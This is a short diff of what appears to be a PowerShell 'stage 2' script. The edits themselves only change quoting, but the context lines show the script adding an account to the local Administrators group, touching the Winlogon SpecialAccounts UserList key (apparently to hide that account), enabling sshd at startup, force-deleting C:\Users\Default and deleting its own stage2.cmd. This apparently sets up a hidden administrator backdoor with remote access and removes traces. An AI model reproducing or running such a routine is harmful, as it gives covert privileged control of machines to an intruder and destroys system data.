@@ -11,7 +11,7 @@ Add-LocalGroupMember -Group "Administrators" -Member "$admin_name"
 Write-Verbose "$admin_name added to the local administrator group"
 
 # clearing the new_admins_folder
-Remove-Item -Force "C:\Users\Default"
+Remove-Item -Force C:\Users\Default
 
 # registry
 $some_string = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
@@ -27,4 +27,4 @@ Set-Service -Name sshd -StartupType 'Automatic'
 
 
 # del stage2.cmd
-Remove-Item "./stage2.cmd"
+Remove-Item stage2.cmd
